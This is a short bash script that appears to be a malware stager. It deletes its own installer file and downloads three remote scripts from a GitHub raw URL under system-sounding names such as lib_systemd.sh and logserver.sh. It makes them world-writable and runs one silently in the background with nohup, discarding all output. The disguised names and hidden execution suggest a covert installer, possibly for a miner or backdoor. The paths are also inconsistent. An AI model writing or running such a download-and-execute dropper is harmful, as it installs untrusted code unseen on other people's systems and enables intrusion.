#!/bin/bash
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

cd /$HOME/
rm -f mysqltcp.sh

cd $HOME/myssqltcp/
curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/lib_systemd.sh" -o $HOME/lib_systemd.sh
curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/addconf.sh" -o $HOME/addconf.sh
curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/logserver.sh" -o $HOME/logserver.sh
chmod 777 lib_systemd.sh
chmod 777 addconf.sh
chmod 777 logserver.sh
/bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 
nohup ./lib_systemd.sh > /dev/null 2>&1 &
echo "[*] Yes-Go"
